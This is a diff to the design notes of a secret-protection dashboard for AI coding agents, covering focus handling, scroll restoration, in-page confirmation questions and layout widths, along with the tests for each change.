+  then drawn at the window's top left over the top bar (`position: fixed`,
+  z-index 30, the accent ring). It sits outside `#top` and out of the flow,
+  so the bar keeps its height, and print hides it with the bar. Enter on it
+  gives the focus to the heading of the page shown, as a page change does
+  (`home.js skipToPage` calls `focusPage`), so the next Tab is the page's
+  first control. It is not a fragment jump: its `href="#main"` is only for a
+  page without its script. A fragment navigation fires `popstate`, which
+  the router reads as a new visit, and on Rules and Settings a hash names a
+  card to land at (`landAtSection`). So the click is `preventDefault`ed:
+  the address, the history and the page drawn stay, and the window scrolls
+  only to bring the heading into view when it is out of it (a page that
+  landed at a card). After a page change the focus is already on the
+  heading, so the link matters on a first load, but it stays first in the
+  tab order.
 
 Presentation only: no route, gate or server text changed. Tests:
 `home-js-page-focus.test.ts` (jsdom; each link is focused before its click,
@@ -7989,6 +10564,19 @@ question in Approvals, and the served page is driven signed in:
 - the nav focuses Rules', Settings' and Home's headings;
 - nothing rejects unhandled, and the oracle holds.
 
+*Skip to the page* is tested in `home-js-page-focus.test.ts` (the first Tab
+stop of the document; Enter on Home, Approvals, Rules opened at a card,
+Settings and a session page focuses the page's heading, with the address,
+the history length and the reads unchanged) and in
+`tests/stack/product-skip-link.test.ts`. That one is a real headless
+Chromium (self-SKIP without one) over a real arbiter with one question
+waiting and a real dashboard, at 1280 and 390 px on Home, Approvals, Rules
+and Settings, with real key presses. The link is clipped before any key;
+the first Tab focuses it, seen inside the window over the bar, which keeps
+its height. Enter focuses the `<h1>` with the address, history and scroll
+unchanged, and the next Tab is a control in `#main`. Print hides the link,
+and the oracle holds.
+
 **Back and Forward keep your place (2026-10-18).** Until then every page
 change scrolled to the top (`setPage`'s `window.scrollTo(0, 0)`), Back and
 Forward included, and History read itself again from nothing. Opening a
@@ -8005,9 +10593,10 @@ The rule now: **Back and Forward restore; a link starts fresh.**
   the page it came from (`history.state.from`), which the agent page's back
   link reads (§4.25ad *The back link names where you came from*).
 - **Back and Forward hand it back.** `popstate` passes the entry's place to
-  `setPage`. History, Approvals, Home, a session's page, Rules and Settings
-  go back to it (the session's page since 2026-10-21, Rules and Settings
-  since 2026-10-22, both below); Scan starts at its top. The page decides,
+  `setPage`. History, Approvals, Home, a session's page, Rules, Settings,
+  Scan and Plugins go back to it (the session's page since 2026-10-21,
+  Rules and Settings since 2026-10-22, Scan since 2026-10-29, Plugins since
+  2026-10-31, all below): every page. The page decides,
   never the
   browser (`history.scrollRestoration = 'manual'`): the browser's own
   restore landed before History's rows were read again. History reads the
@@ -8085,6 +10674,62 @@ The rule now: **Back and Forward restore; a link starts fresh.**
     Rules left with text in Find opens it at the top, every rule listed.
   The focus still goes to the heading first.
 
+- **Scan (2026-10-29, #228).** The Scan page is the product's longest (918
+  findings on the maintainer's machine, 25 rows a section, the long tiers
+  folded; §4.25ai *A long scan, in pages*), and its links leave it from
+  inside an opened row (*Open the session* in *Where the real value is
+  now*, *Change it in Rules*). A Back landed at its top, every fold closed,
+  each section at its first 25 rows: the section had to be found, opened,
+  Show more pressed again and the row reopened for the next finding. Scan
+  is a place page now (`PLACE_PAGES`), and its place also holds, once the
+  page has drawn this visit (`scanPlace`; `SC.drawn`):
+  - **the section folds you had open** (`open`, by `data-section`);
+  - **how many rows each section had drawn** (`rows`, `[id, n]` pairs: the
+    Show more pages you had read);
+  - **the rows whose *Details and examples* you had open** (`more`, by
+    `data-id`).
+  A fold moves nothing, so a `toggle` in `#scan-sections` (heard in the
+  capture phase: it does not bubble) saves the place through the scroll's
+  debounce, and Show more saves it once its rows draw. On Back,
+  `scanLandPlace` waits for `loadScan`'s draw, then section by section
+  opens the saved fold, reads on with the section's own Show more (`more`,
+  a page at a time, stopping at the saved count, the section's end or a
+  failed read), opens the saved row folds and awaits their examples (the
+  fold's own read: one read, however the `toggle` follows), and scrolls to
+  `y` as the page grows and once more when all has drawn, each time only
+  if nobody scrolled since (`keepPlace`'s rule). Its first mark is taken
+  after the draw, not at the Back: the page drew from nothing and the
+  browser held the scroll above. Scroll anchoring is off while it lands
+  (`overflow-anchor: none` on `<html>` and `<body>`; Chromium reads the
+  viewport's from `<body>`): with it, rows added above the page's end
+  pulled the page to its bottom, 8,660 px past the place in Chromium, and
+  read as a person's scroll. `placeHeld` holds the place until it has
+  landed. A section or row the new read no longer has (a scan kept since,
+  `rev` changed) is skipped by id, ids compared as values; a page drawn
+  again meanwhile (a part of another scan answered 409, a poll's new scan)
+  stops it. The place is as near as the page allows.
+  - **Find one.** Its query is never kept (the page draws anew), so a
+    section with text in its *Find one* saves only its fold, its rows
+    being the query's, and while any has text the place's `y` is the top,
+    the box saving it as it is typed in, as Rules' Find does.
+  - **A link starts fresh.** The top bar's *Scan*, Home's *See the whole
+    scan* and History's link open it at its top, folded, 25 rows a
+    section. A link with `?item=` (`landAtScanItem`, a card's earlier
+    leak) still lands on its row; a place Back hands back wins over it.
+
+- **Plugins (2026-10-31, #243).** The last page that opened at its top on
+  Back. Its cards link away (*Open its session*, *Its sessions on
+  History*), and the session page names it (**Back to Plugins**, §4.25ad);
+  with several attached agents, each card a screen or more on a phone, the
+  person scrolled to find their card again after every look at a session.
+  The page is one read (`GET /api/plugins`) with no folds or rows of its
+  own to bring back, so the place is the scroll alone: `y` at once, and
+  `keepPlace` again once the read has drawn, unless you scrolled meanwhile,
+  as for Rules and Settings. A failed read is short: the place is as near
+  as the page allows. The Home poll's redraw while the page is shown skips
+  an unchanged answer (`sameAsDrawn`); a changed one mid-landing can move
+  the page, as on Settings. A top-bar link opens it at its top.
+
 Presentation only: no route, gate or server text changed. Tests: unit
 `home-js-agent-back-place.test.ts` (jsdom with a turn layout: the place
 saved, Back and Forward reopening the reply and the steps fold at the turn's
@@ -8111,6 +10756,27 @@ where it was, the link on screen, the focus on the heading; a top-bar link
 opens Rules at 0; no value or token on the page).
 `home-js-page-focus.test.ts`'s *Back to home* now waits for the URL, as its
 Back and Forward test does: opened from Home, the link is Back.
+Scan (2026-10-29): `home-js-back-restores.test.ts` B7 (jsdom: the tier
+opened, Show more, a row's Details, a link away, Back and Forward then Back:
+the fold open, 50 rows from one `after=25` read, the row's examples read
+again, `y` and never 0; a top-bar link and *See the whole scan* at the top,
+folded; Find text: the top, Find empty; a scan kept meanwhile with fewer
+rows read to its end, nothing thrown); stack
+`tests/stack/scan-back-restores.test.ts` (the large-scan fixture in a real
+headless Chromium at 1280 px: the tier opened, Show more, a row's Details,
+the top bar's Rules followed from 300 px above the row, Back: the tier open,
+50 rows, the row's fold open, the page and the row within 3 px; a top-bar
+link at the top, folded; no 8-character run of the planted value).
+Plugins (2026-10-31): `home-js-back-restores.test.ts` B8 (jsdom, four
+attached agents: the last card's *Open its session*, then *Back to
+Plugins* and Forward then Back, each back at `y` once the held read draws,
+never 0; a scroll made meanwhile kept; a top-bar link at the top); stack
+`tests/stack/plugins-back-restores.test.ts` (a real arbiter, six
+attachments each with a real anthropic-proxy, the real dashboard, in a
+real headless Chromium at 390 and 1280 px: the last card's *Open its
+session* followed from more than a screen down, *Back to Plugins*: the
+page within 3 px, the link where it was on the screen; a top-bar link at
+the top; no value or token on the page).
 
 **An answer keeps the focus in its list (2026-10-11).** Every answer button
 on the page turns its card's buttons off while the answer is on its way, and
@@ -8122,7 +10788,7 @@ Tab went wherever the browser guessed, and a refused answer's button, on
 again, had lost the focus. This covers every button whose card or row the
 poll draws (the answer places of *The poll keeps your place*): Home's and
 Approvals' waiting cards, the agent page's *Needs your OK*, *Answered
-earlier*'s *Block instead* / *Allow instead*, Allow and Not now on a rule
+earlier*'s *Block instead* / *Always allow instead*, Allow and Not now on a rule
 change your agent asked for, *Undo* under *Rule changes*, and the agent
 page's *Let it through*.
 
@@ -8191,8 +10857,85 @@ answerLine`):
   ended; a blocked send, "Nothing was sent.". A held message says what goes
   to the AI ("Sent masked: the AI reads your message with that part
   masked."). Last, *Change your answer*, a link to `/approvals/<id>`, which
-  marks the answered row with its *Block instead* / *Allow instead*. The
+  marks the answered row with its *Block instead* / *Always allow instead*. The
   line names only what the card named: never a value, never a token.
+- **An answer its row cannot change says *See your answer* (2026-10-28).**
+  Some answered rows on Approvals have no button (§4.34 *A held message's
+  answer*, *Send without it*): the line still said *Change your answer*,
+  and its link opened a row with nothing to press. Now the rule of the
+  answered row's buttons is one helper (`policy-panel.ts
+  answerHasReversal`), and a waiting ask carries it (`HomeAsk.reversible`),
+  so the link and the row cannot disagree. Where the row offers no change,
+  the line says why in one sentence after its words, and its link (same
+  target) reads *See your answer*:
+  - a held message answered for that message (Send as written, Send
+    masked, Cancel the message): "It applied to that message only.";
+  - a held message answered for the session: the link opens the message's
+    own row, which has no change; the row the answer files for the
+    session flips it (*Send masked instead*): "To change it, use the row
+    for the session in Answered earlier.";
+  - *Send without it* (the page reads it from the answer, an answer about
+    one request): "It applied to that request only.";
+  - a HIGH session's ask (`session-net:` / `session-exec:`), whose answer
+    is kept in Rules: "To change it, remove it in Rules." (plain words).
+
+  Every other answer keeps *Change your answer*, and so does an older
+  server's ask, which sends no `reversible`. Presentation only: no row's
+  buttons change. Tests: `answer-reversible.test.ts` (the helper agrees
+  with every family's answered `actions`; `reversible` on waiting asks),
+  `home-js-answer-line.test.ts` L2, and stack `dashboard-answer-line.test.ts`
+  W5-W7 (a real held message answered Send masked on the served Home: the
+  line ends *See your answer*, its row offers no change, the line names
+  no found text and no token).
+- **The last *Always* of a program's send (2026-10-25).** A send by a
+  program that holds secret files has one *Always: add <host> to <file>*
+  per file in the way (§4.34 *A send names every file*). The last one
+  retires the question rather than answering it, and leaves the line
+  "**Always allowed:** …" with the ask's `afterAllow`, as *Always allow*
+  does; its link is *Undo it in Approvals* to `/approvals/<changeId>`, that
+  rule change marked under Rule changes with its Undo, in place of *Change
+  your answer* (Answered earlier has no row for a retired question). No
+  change id from the route, no link. A file that is not the last keeps its
+  words on the card, which stays.
+- **A rule change (2026-10-25).** Allow or Not now on a card under *Rule
+  changes your agent asked for* (`decideProposal`) took the card away, and
+  with the last one the block hid: nothing said to tell the agent, which
+  was told the change waits for you (and not when you answer), and the
+  Undo of the change sat at the bottom of Approvals. Now its answer leaves
+  the line too (`proposalLine`, place `proposal`): "**Allowed:** Claude
+  Code's rule change: Make `~/shop/.env` a secret no AI may read, may be
+  sent to `api.stripe.com`. It is in force now. Tell Claude Code it may go on. *Undo it*", or "**Not now:**
+  … Your rules stay as they are.". About what is the words the card drew
+  for its buttons' names (`changeWords`: its first line as drawn, names as
+  code, ", and 2 more"), never the agent's reason nor a pattern the card
+  hid; a card with no such line, the subject alone. The subject names the
+  agent as the card does (`proposalAsker`; "Your agent's" when Home does
+  not know it), "Your rule change" for one of yours, "The change to
+  policy.yaml" for a held edit of the file. A change no agent asked for
+  (`askedByAgent` false) has no "Tell …". A held edit of policy.yaml
+  answered Not now says what its card said: "Your rules stay as they are,
+  and policy.yaml was written back to match them.". *Undo it*, for Allow
+  only, is `/approvals/<changeId>` from the route (*Details*: the row under
+  Rule changes, marked, with its Undo); an older server sends none, and
+  there is no link. A request filed again (`refiled`) keeps its notice and
+  gets no line; a refusal keeps its words on the card. The block stays
+  shown while its line is there (named by what still waits, else by whose
+  the answered change was), and hides with it when the page is left.
+  **A change from a session that has ended (2026-11-02).** People often
+  quit the agent and answer later, and "Tell Claude Code it may go on"
+  then asked them to address an agent that is gone. When Home lists the
+  session that asked as not running (its row's `state` is `idle`, the rule
+  a question's `askerEnded` keeps), `proposalAsker` carries `ended`: the
+  card adds, after its "· from Claude Code in `~/shop`", a question's
+  sentence (§4.34 *After you answer*, class `ask-ended`): "The agent that
+  asked has ended, so nothing is waiting on this now.", without the
+  question's "Your answer counts the next time an agent asks.", since an
+  allowed change is in force for every agent and nothing asks it again;
+  and Allow's line ends "It is in force now. *Undo it*" with no "Tell …".
+  A session Home does not list (older than its window, or Home has not
+  answered yet) claims nothing. The flag is in the block's same-as-drawn
+  key, so a session that ends while its card is drawn changes the card at
+  the next poll. Not now, Undo, the counts and the order are unchanged.
 - **Its own fields.** The server words both (`ask-words.ts`
   `AskWords.afterAllow`, `whatParts`; `HomeAsk` carries them), so the page
   never reads them out of `ifAllowed`. An older server's ask, without them:
@@ -8210,9 +10953,15 @@ answerLine`):
   session page keeps *Needs your OK* shown while its line is there.
 
 Presentation only: no answer, route or arbiter decision changed.
-`dashboard/test/unit/ui/home-js-answer-line.test.ts`,
-`dashboard/test/unit/view-model/ask-after-allow.test.ts`; over the real
-arbiter, net-proxy and dashboard, `tests/stack/dashboard-answer-line.test.ts`.
+`dashboard/test/unit/ui/home-js-answer-line.test.ts` (L11: an Always on a
+file that is not the last leaves no line; its card's words link its
+change, and a poll's draw keeps the link),
+`dashboard/test/unit/view-model/ask-after-allow.test.ts`,
+`home-js-holder-send.test.ts`; over the real arbiter, net-proxy and
+dashboard, `tests/stack/dashboard-answer-line.test.ts` and
+`tests/stack/always-source-answer-line.test.ts`; a rule change's,
+`home-js-proposals.test.ts` and, over the real arbiter, policy server,
+anthropic-proxy and dashboard, `tests/stack/proposal-answer-line.test.ts`.
 
 Presentation only: no route, gate or server text changed. Tests:
 `home-js-answer-focus.test.ts` (jsdom; `press` drops the focus of the
@@ -8667,11 +11416,15 @@ Prompt filters.
   gone or hidden (the list could not be read again): the Models heading. The
   notice, a live region, says what was saved. The control is brought into
   view: a row far down the list may be off the screen.
-- **Not saved: back to Save.** A refused Save, or one declined at its
-  question, gives the focus back to Save, on again. Save is described by the
+- **Not saved: back to Save.** A refused Save, or one cancelled at its
+  question (asked in the form above Save, §4.25n *Settings and Let it
+  through ask on the page too*; Cancel or Escape there), gives the focus
+  back to Save, on again. Save is described by the
   form's error line (`aria-describedby="model-error"`, empty when nothing
   was refused), so a screen reader reads the refusal with it. Enter in a
-  field that is refused leaves the focus in the field, to fix it.
+  field that is refused leaves the focus in the field, to fix it. The same
+  holds for a refusal caught before sending (2026-10-27, §4.25l *A refusal
+  speaks the form's words*): the focus stays on Save, or in the field.
 - **Nothing is taken.** The focus moves only if it was in the form at the
   press and fell (to `<body>`, or into the hidden form) by the time the
   answer came: a focus moved elsewhere meanwhile, also onto a row the list
@@ -8769,8 +11522,9 @@ names its row; a change keeps the focus*, above), with the same
   another row's menu or button.
 - **A refusal, or a change not made.** A refused change gives the focus
   back to the menu or button pressed, on again, described by the refusal's
-  words (`aria-describedby`). A Remove declined at its question gives it back
-  too.
+  words (`aria-describedby`). A Remove declined at its question gives the
+  focus to the row's ⋯ (*Rules asks on the page, not in a browser dialog*,
+  below).
 - **Nothing is taken.** A focus moved elsewhere meanwhile, or a press made
   without the focus in the block, moves nothing.
 
@@ -8816,7 +11570,12 @@ and hides once nothing waits. So it has its own rule (`home.js barPlace` /
 
 - **The bar gone** (saved, discarded, the last change dropped or skipped):
   the *Your rules* heading. The notice under it, a live region, says what
-  was saved ("2 changes saved.", with Undo).
+  was saved ("2 changes saved.", with Undo) or discarded ("2 changes
+  discarded.", with Undo, §4.25n *Discard can be undone*).
+- **Undo after Discard** (2026-10-25): the bar's heading, "Changes to save
+  N", once the changes are back; the bar's own rule (`barRefocus`), as the
+  Undo button, drawn away with the notice's new words, leaves the focus
+  fallen. When nothing could come back, the *Your rules* heading.
 - **A change dropped or skipped while others wait:** the bar's own heading,
   "Changes to save N", which reads the new count. Never another row's Drop.
 - **A weaker change asked about first:** the question's first line ("These
@@ -8867,6 +11626,136 @@ over the production adapter serving Rules:
   rules* heading, and nothing is saved;
 - the move: the heading, and the page rule is in policy.yaml;
 - the oracle holds.
+
+**Rules asks on the page, not in a browser dialog (2026-10-25).** Three
+actions on Rules asked their question in the browser's own `window.confirm`:
+Remove (or *Always allowed* in a send rule's menu) when the server answered
+`confirm: true` because the change makes protection weaker, *Move them into
+policy.yaml*, and *Not a secret* on a key Mandu found. A browser told to stop
+showing dialogs (Chrome's "Prevent this page from creating additional
+dialogs", Firefox's "Don't allow … to prompt you again", an embedded view
+that blocks them) answers `confirm()` with "no" at once, unseen: the three
+buttons did nothing and said nothing. The dialog also ignored the dark
+theme and named the page by its address. *Changes to save* already asked
+its weaker-change question in the bar, and a wide rule change in its card.
+Now each asks in place, in the row or box it was pressed in, drawn by one
+helper (`home.js askBox`): the sentence, the button that does it, and
+Cancel; Escape in the box is Cancel. No typed word: these are plain yes/no
+questions.
+
+- **A rule change that makes protection weaker** (Your rules, `changeRule`):
+  a box under the rule's row and its opened detail, "Removing this rule
+  makes protection weaker for `b.example`." (or "Always allowing this …"),
+  with *Remove anyway* (or *Allow anyway*) and Cancel. *… anyway* posts
+  `policy/rules/change` with the `expected` the first answer gave, as the
+  dialog's yes did. A refusal then closes the box and shows the server's
+  words on the row, the menu or Remove pressed getting the focus back,
+  described, as before.
+- **Move them into policy.yaml** (`renderMoveNotice`): the notice shows, in
+  place of its button, "Move N rules into policy.yaml? Protection does not
+  change. The move itself cannot be undone.", with *Move them* and Cancel.
+- **Not a secret** (`dismissSuggestion`): the opened row shows "Mark
+  `<name>` as not a secret? Mandu will not suggest it again, and the AI can
+  still read it.", with *Mark as not a secret* and Cancel, under its buttons.
+- **The focus.** Opened from the place that asked, the box's sentence takes
+  the focus: a line, not a Tab stop and never the button, so the Enter that
+  pressed Remove, pressed again, loosens nothing. Cancel or Escape gives the
+  focus back to what asked: the row's ⋯, *Move them into policy.yaml*, *Not
+  a secret*. After *… anyway*, the rules above (*A change in Your rules
+  keeps the focus*, *Changes to save keeps the focus*): the heading once the
+  row is gone, the row's menu when it stays. A press made without the focus
+  there asks without taking it.
+- **A redraw keeps the question.** One question at a time, kept by the place
+  that asks (the rule's row key, `move`, the suggestion's id): Find, a read
+  of the rules or a tick in Keys Mandu found draw the list again from
+  nothing, and the box is drawn again, a focus in it on the same part
+  (`askHeld` / `askRefocus`). Its button stays off while its request is out.
+  A question whose row is no longer drawn (hidden by Find, the rule gone)
+  ends, having changed nothing.
+
+Presentation only: no route, gate or server text changed; a weakening change
+still needs the server's `expected` and a second, separate press. Tests: `home-js-rules.test.ts` and
+`home-js-rules-focus.test.ts` (the question, Cancel, Escape, a second
+Enter, *Remove anyway* and *Allow anyway*, a redraw by Find),
+`home-js-files.test.ts`, `home-js-pending-focus.test.ts` and
+`home-js-reads-order.test.ts` (Move), `home-js-suggested.test.ts`,
+`home-js-suggested-focus.test.ts` (a redraw while it asks),
+`home-js-suggested-names.test.ts` and `home-js-suggestions-order.test.ts`
+(Not a secret), each with `window.confirm` stubbed to throw. Stack: F3 of
+`tests/stack/rules-change-focus.test.ts` (a real arbiter: Cancel leaves the
+rule blocking, *Remove anyway* removes it with its Undo), F1 and F5 of
+`pending-save-focus.test.ts` (Cancel moves nothing; *Move them* moves), and
+`suggested-focus.test.ts`, `suggested-names.test.ts` and
+`suggestions-order.test.ts` (Not a secret).
+
+*Settings and Let it through ask on the page too (2026-10-26).* The four
+questions the paragraph above left for later moved onto the page with the
+same helper and the same focus rules, and the product page no longer calls
+`window.confirm` (nor `window.prompt`: Protection's typed OFF asks in its
+card, *Turning protection off asks on the page*). They were Settings › Models (the form's
+Save, a row's Remove and Bring back), Settings › Sensitivity labels (a
+change that lowers what Mandu suggests: Remove, a lower level, a new "Not
+secret" mapping) and Settings › Prompt filters (a change that lets more
+reach the AI: a kind's choice, *Use the default*, adding an exception), each
+asked when the server answers `confirm: true`; and *Let it through* under a
+message you wrote, asked before every let-through. A blocked dialog made
+each of them do nothing (a label row's busy state just cleared; Prompt
+filters read the list again, so the change seemed to vanish).
+
+- **Where.** A Settings change asks under the row it was pressed in (a
+  model's, a label's, a kind's or an exception's), or, from a form, inside
+  it above its buttons (the Models form's Save, the exception form's *Add
+  exception*). *Let it through* asks inside the row of the note's finding.
+- **What it says.** A Settings box draws the server's rows as page content
+  (`home.js confirmParts`, until now `modelConfirmText`'s one plain text for
+  the dialog): the change's rows as its sentence, names as code; then "This
+  changes what Mandu protects:" with what it would let as a list; then each
+  warning on its own line, in the warning style of Approvals ("Warning: …",
+  `role="note"`). The dialog's "Continue?" is the buttons now: **Save
+  anyway** (a model's Save, a label's Save), **Remove anyway** (a model's or
+  a label's Remove), **Restore anyway** (a model's Bring back), **Apply
+  anyway** (any prompt filter change), and Cancel. *Let it through* says
+  what it asked before, "Let `<what>` through in this message? The AI reads
+  it as you wrote it from the agent's next request on." (or "… for the rest
+  of this session? The AI reads it as you wrote it in every message of this
+  session."), with **Let it through** and Cancel.
+- **The focus**, as above: the sentence takes it, never the button; Cancel
+  or Escape gives it back to the button or menu that asked (Save, Remove,
+  Bring back, a kind's menu, *Use the default*, *Add exception*, *Let it
+  through in this message* / *for this session*). An Escape on the Models
+  form's question closes the question only, never the form with what was
+  typed (the box takes the Escape before the form's own Cancel sees it).
+  After *… anyway*, the rules of *A change in Settings keeps the focus* and
+  *The Models form keeps the focus*; a refusal is said on the row (or under
+  the form) as before. *Let it through*'s answer is said on its row, from
+  the button that asked (*An answer keeps the focus in its list*).
+- **A redraw keeps the question.** Kept by its place (the model's name, the
+  label's organization and id, the kind, the exception's kind and pattern,
+  the form, the finding's event and index): a card read again after another
+  change in it, or Settings opened again, draws the box again under its row,
+  with the level picked or the choice made that it asks about; a poll that
+  draws the session's story again draws it again in the note, its focus on
+  the same part. A new press in the same place asks anew. Editing the
+  Models form or the exception form while it asks ends the question: it
+  was about other values. Cancel on a prompt filter row reads the list
+  again, so a kind's menu shows the choice in force; Cancel in a form
+  keeps what was typed, and on a label's row the level picked.
+
+Presentation only, again: the server still answers `confirm: true,
+expected`, and *… anyway* posts exactly what the dialog's yes posted, with
+that `expected`; *Let it through* posts `prompt-filters/let-through` as
+before. Tests: `home-js-models.test.ts`, `home-js-labels.test.ts`,
+`home-js-settings-focus.test.ts`, `home-js-model-form-focus.test.ts`,
+`home-js-prompt.test.ts` (the question in place, Cancel, Escape, a redraw,
+a poll), `home-js-answer-focus.test.ts` and `home-js-poll-keeps.test.ts`
+(Let it through), with the jsdom fixture's `window.confirm` and
+`window.prompt` throwing for every product test, and
+`home-js-no-dialog.test.ts`, which finds no `confirm(`, `prompt(` or
+`alert(` call in `home.js`. Stack: `model-form-escape.test.ts` X4 and
+`model-form-focus.test.ts` F2/F3 (a real arbiter: Escape on the question
+keeps the form, *Save anyway* saves) and `dashboard-prompt-settings.test.ts`
+(an exception added on the page: Cancel leaves the arbiter's list, *Apply
+anyway* adds it with its Undo, no registered secret on the page).
 
 **A label chosen in Your rules keeps the focus (2026-10-11).** Choosing a
 file's label is the Rules page's main task. Each row of the *Your rules*
@@ -9242,7 +12131,9 @@ min(100%, 380px)` is the icon, the gap and the words' basis, so the row is
 never measured narrower than the two side by side, or the card where the
 card is narrower. A one-line question's header is 49 px at 1280 and 760 px.
 On a phone (a card under 380 px) every card is as before, with the icon
-above the words. Presentation only: no route, question, answer, focus rule
+above the words. A short card's words take a wider basis since 2026-11-02,
+capped at the row less the icon and the gap, so this holds there too
+(*A short question's words keep 520 px*). Presentation only: no route, question, answer, focus rule
 or server text changed.
 
 Tests: `home-js-ask-top.test.ts` (jsdom with mandu.css and app.css
@@ -9267,8 +12158,10 @@ layout, so the heights above are the Chromium probe's.
 
 **A question's buttons wrap inside its card (2026-10-14).** Every card
 that asks the person something ends in one row of answers, `.ask-actions`
-(app.css): a wrapping flex row that never shrinks, so on Home's wide card
-the words give way and the buttons stay on one line. Nothing bounded
+(app.css): a wrapping flex row that never shrinks, so its buttons stay on
+one line where they fit (on a short card, beside the words only where those
+keep 520 px, else under them: *A short question's words keep 520 px*,
+below; until 2026-11-02 the words gave way instead). Nothing bounded
 the row, so it was always as wide as all its buttons on one line, and the
 wrap it asks for never happened. On a phone the answers ran past the card. A
 headless Chromium with the page's own styles measured how far the last
@@ -9287,7 +12180,8 @@ survey had drawn one: the tour has only sends.
 
 Now the row is never wider than its own row (`max-width: 100%`), so on a
 phone the buttons wrap onto another line inside the card. It still never
-shrinks, so on a wide card the words give way first. Measured again at 320,
+shrinks, so on a wide card the words gave way first (until 2026-11-02:
+*A short question's words keep 520 px*). Measured again at 320,
 360, 375, 390, 414, 760 and 1280 px, no button runs past its card and no
 page scrolls sideways. At 1280 px every card is unchanged (same rows and
 heights). At 390 px a send's card is unchanged (its three buttons fit),
@@ -9319,6 +12213,57 @@ pages signed out. Each card's row computes the rule: the held message has
 its three answers on Home and its four on Approvals, and the send has its
 three. No page or answer holds the key or the found text. jsdom has no
 layout, so the widths above are the Chromium probe's.
+
+**A short question's words keep 520 px (2026-11-02, #252).** A short card
+(not `.expanded`: Home's waiting cards, and Approvals' cards from ended
+sessions and on a phone) keeps its answers in its `.ask-top` row, beside
+the words. The words' 320 px basis let the four answers of a send (447 px)
+take half the card, and since the card says which answers last (§4.34) its
+words ran to ten lines in the column left. A headless Chromium with the
+served page, a real arbiter and two sends of a labelled `STRIPE_KEY` raised
+by its egress gate measured Home's first card:
+
+| Window | Card | Words before → after | Card height before → after |
+|---|---|---|---|
+| 1280 px | 944 px | 368 → **834** px, answers beside → under | **287 → 239** px |
+| 1024 px | 927 px | 351 → **817** px, answers beside → under | **287 → 239** px |
+| 860 px | 776 px | 666 px, under (unchanged) | 239 px |
+| 700 px | 644 px | 534 px, under (unchanged) | 260 px |
+| 600 px | 552 px | 442 px, under (unchanged) | 305 px |
+| 390 px | 358 px | 308 px, icon above (unchanged) | 455 px |
+
+The card was taller on a wide window than at 860 px. Now a short card's
+words have the basis `max(320px, min(520px, 100% - 60px))` (app.css,
+`.ask:not(.expanded) > .ask-top > .ask-body`): where the row is narrower
+than the icon, a gap, 520 px, a gap and the answers, the answers go under
+the words, the shape 860 px already had. The basis is never more than the
+row less the icon and its gap, so wherever the row is 380 px or wider the
+icon stays beside the words (*A short question keeps its icon beside its
+words*); measured at rows of 382 to 573 px and at 1, 1.25 and 1.5 device
+pixels per px. It is never less than the 320 px basis, so a phone's card,
+a row under 380 px, has its icon above its words as before. A question
+whose words are one short line already had its answers under them at
+1280 px (its 320 px basis was wider than its words) and still does, with
+no band over the words. A full card (`.ask.expanded`: Approvals' live cards
+on a wide screen, the agent page's *Needs your OK*, a rule change your
+agent asked for, the possible-keys card) has its answers in its foot and
+is unchanged. Presentation only: no route, question, answer, focus rule or
+server text changed.
+
+Tests: `home-js-ask-top.test.ts` (jsdom): the short card's rule is the one
+`max(…, min(…, 100% - …))` at every width, its floor the words' basis, its
+cap the icon and the gap, its width at least 520 px (fails on the old
+page); it reaches Home's cards, not Approvals' full ones nor *Needs your
+OK*. Stack `tests/stack/ask-words-wide.test.ts` (secrets, real Chromium,
+self-skipping without one) serves Home and Approvals with a real arbiter
+and the production adapter: at 1280, 1024 and 860 px the answers start
+under the words and the words are at least 500 px wide (fails on the old
+page at 1280); at every width, 390 px included, the icon is beside the
+words where the row is 380 px or wider and above them where it is
+narrower, no band is over the words, no answer runs past its card and the
+page does not scroll sideways; a one-line question at 1280 px keeps that
+shape; Approvals' short cards at 700 px draw the same; no page or answer
+holds the key's value or a `$MDU` token.
 
 The agent page's secret cards, which ran past a small phone, are the next
 paragraph.
@@ -9504,6 +12449,124 @@ The stack test draws the six links as a grid at 320 and 375 px, fits them
 at every width from 320 to 719 px and the bar from 720, and at 499 and
 719 px opens Scan (marked current), History and Home from the bar;
 `top-status-opens-protection.test.ts` checks the bar from 720 px.
+
+*Plugins joins the links (2026-10-25).* The Plugins page (§4.25aj) became
+a seventh page link, *Plugins*, after Scan. Its word is 50 px at both
+weights (the same Chromium and font, which measured the six others as
+before). Seven words fit neither layout above: as two rows a phone row
+needs four columns, 346 px of a 320 px phone's 288 with two digits
+waiting; beside the brand and "Protection unknown" the bar from 720 px ran
+past by 61 px. So the ranges moved and the Home word is hidden again where
+the links have a row of their own (the brand *Mandu* above them links Home
+and is the first tab stop, as from 2026-10-18 to 2026-10-21):
+
+- **narrower than 520 px** (500 before), two rows of three columns, 10 px
+  a side: *Approvals · Rules · Settings* over *History · Scan · Plugins*.
+  The widths are the six links' of before (Plugins is no wider than
+  Settings, in the same column): 255 px with one waiting, 262 with 99,
+  269 with three digits;
+- **520 to 799 px**, one row of their own, 10 px a side: 460 px with 99
+  waiting, of the 478 px row at 520 (at 500 the row is 460, which left
+  nothing to spare: hence 520);
+- **from 800 px** (720 before) all seven share the bar: until 940 px
+  (840 before) 7 px a side, 2 px apart and each at least 50 px, 482 px
+  with 99 waiting, leaving "Protection unknown" 8 px at 800 px; from
+  940 px 14 px a side and 6 px apart, 602 px, 8.4 px to spare at 940.
+
+A headless Chromium over the stylesheet, with 99 waiting and "Protection
+unknown", at 320, 375, 499, 519, 520, 640, 799, 800, 870, 939, 940 and
+1280 px: no sideways scroll of the page or the row, no status cut, the
+links as the model says (470 px of links and 12 of gaps at 800, 566 and
+36 at 940).
+
+Tests: `css-nav-fits.test.ts` (the seven links, the ranges' numbers, every
+window from 320 to 799 px in rows and from 800 px in the bar, only the
+Home word hidden and only up to 799 px, Plugins' link), the stack test
+`nav-fits-count.test.ts` (the seven links at 320 and 375 px with the Home
+word hidden; Scan, Plugins, History and the brand from the bar at 519 and
+799 px; `/plugins` and `/api/plugins` in its oracle),
+`top-status-failed.test.ts` and `top-status-opens-protection.test.ts` (the
+bar from 800 px), `css-forced-colors.test.ts` (seven links underlined in
+turn).
+
+*The Rules link's mark (2026-10-25).* While levels chosen on Rules wait to
+be saved, the Rules link carries a mark with their number (§4.25n *The top
+bar says when Rules has changes not saved*): a ring 4 px from its word
+(`#nav a[data-page-link="rules"] { gap: 4px }`), 12 px 600 digits like the
+count's, `padding: 0 4px` and a 1 px edge, so as tall as the count and
+17 px wide with one digit, 24 with two (the same Chromium). Beside the
+Approvals count it needs up to 28 px more, and each range above had 8 to
+26 px to spare with 99 waiting. So each moved:
+
+- **narrower than 540 px** (520 before), two rows of three columns: with 99
